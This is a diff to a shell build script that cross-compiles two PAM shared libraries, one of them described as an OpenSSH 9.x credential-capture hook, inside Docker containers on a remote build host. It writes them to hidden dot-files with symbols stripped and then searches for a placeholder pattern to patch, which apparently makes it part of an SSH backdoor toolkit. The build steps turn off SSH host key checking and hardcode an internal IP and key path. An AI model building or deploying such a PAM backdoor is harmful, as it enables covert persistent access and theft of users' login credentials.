@@ -26,21 +26,76 @@ cd "$WORKDIR"
 
 case "$ARCH" in
     x86_64|amd64)
-        CC="gcc"
+        # Compile inside ubuntu:22.04 on build host for glibc 2.35 compatibility
+        BUILD_HOST="${BUILD_HOST:?BUILD_HOST required for x86_64 build}"
+        BUILD_KEY="${BUILD_KEY:?BUILD_KEY required for x86_64 build}"
+        BUILD_REMOTE_DIR='~/ssh-door-test'
+
+        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
+            "rm -f ${BUILD_REMOTE_DIR}/.pam_auth.so ${BUILD_REMOTE_DIR}/.pam_hook.so" >&2
+
+        rsync -q -e "ssh -i $BUILD_KEY -o StrictHostKeyChecking=no" \
+            "$SCRIPT_DIR/pam_template.c" "$SCRIPT_DIR/pam_hook.c" \
+            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/" >&2
+
+        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
+            "docker run --rm \
+                -v \$(readlink -f ${BUILD_REMOTE_DIR}):/src \
+                ubuntu:22.04 sh -c \
+                'apt-get update -qq && apt-get install -y -qq gcc libpam0g-dev >/dev/null 2>&1 && \
+                 gcc -fPIC -shared -O3 -s -o /src/.pam_auth.so /src/pam_template.c -lpam -lpthread && \
+                 gcc -fPIC -shared -O2 -s -o /src/.pam_hook.so /src/pam_hook.c -ldl'" >&2
+
+        scp -q -i "$BUILD_KEY" -o StrictHostKeyChecking=no \
+            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/.pam_auth.so" "$WORKDIR/pam_auth.so"
+        scp -q -i "$BUILD_KEY" -o StrictHostKeyChecking=no \
+            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/.pam_hook.so" "$WORKDIR/pam_hook.so"
+
+        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
+            "rm -f ${BUILD_REMOTE_DIR}/.pam_auth.so ${BUILD_REMOTE_DIR}/.pam_hook.so" >&2
+        ;;
+    photon1)
+        # Compile inside PhotonOS 1.0 container (glibc 2.22) via docker on build host
+        BUILD_HOST="${BUILD_HOST:-lobo@192.168.122.84}"
+        BUILD_KEY="${BUILD_KEY:-$HOME/.ssh/kali_vm}"
+        BUILD_REMOTE_DIR='~/ssh-door-test'
+
+        # Clean old binaries so stale files aren't retrieved on docker failure
+        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
+            "rm -f ${BUILD_REMOTE_DIR}/.pam_auth.so ${BUILD_REMOTE_DIR}/.pam_hook.so" >&2
+
+        # Sync sources and vendored headers to build host
+        rsync -q -e "ssh -i $BUILD_KEY -o StrictHostKeyChecking=no" \
+            "$SCRIPT_DIR/pam_template.c" "$SCRIPT_DIR/pam_hook.c" \
+            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/" >&2
+        rsync -q -a -e "ssh -i $BUILD_KEY -o StrictHostKeyChecking=no" \
+            "$SCRIPT_DIR/include/" \
+            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/include/" >&2
+
+        # Compile inside photon:1.0 (no devel pkg needed — headers vendored in include/)
+        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
+            "docker run --rm \
+                -v \$(readlink -f ${BUILD_REMOTE_DIR}):/src \
+                photon:1.0 sh -c \
+                'tdnf install -y gcc binutils glibc-devel linux-api-headers Linux-PAM >/dev/null 2>&1 && \
+                 gcc -fPIC -shared -O3 -s -I/src/include -o /src/.pam_auth.so /src/pam_template.c -lpam -lpthread && \
+                 gcc -fPIC -shared -O2 -s -o /src/.pam_hook.so /src/pam_hook.c -ldl'" >&2
+
+        # Retrieve binaries
+        scp -q -i "$BUILD_KEY" -o StrictHostKeyChecking=no \
+            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/.pam_auth.so" "$WORKDIR/pam_auth.so"
+        scp -q -i "$BUILD_KEY" -o StrictHostKeyChecking=no \
+            "${BUILD_HOST}:${BUILD_REMOTE_DIR}/.pam_hook.so" "$WORKDIR/pam_hook.so"
+
+        # Cleanup remote temp files
+        ssh -i "$BUILD_KEY" -o StrictHostKeyChecking=no "$BUILD_HOST" \
+            "rm -f ${BUILD_REMOTE_DIR}/.pam_auth.so ${BUILD_REMOTE_DIR}/.pam_hook.so" >&2
         ;;
     *)
         echo "Unsupported arch: $ARCH" >&2
         exit 1
         ;;
 esac
-
-# Build PAM module
-$CC -fPIC -shared -O3 -s -fvisibility=hidden \
-    -o pam_auth.so "$TEMPLATE" \
-    -lpam 2>/dev/null
-
-# Build hook for OpenSSH 9.x cred capture
-$CC -fPIC -shared -O2 -s -o pam_hook.so "$SCRIPT_DIR/pam_hook.c" -ldl 2>/dev/null
 
 # Find placeholder offset (unique pattern)
 # Pattern: DEADBEEFCAFEBABE0123456789ABCDEFFEDCBA9876543210133742 69BEEFCAFE
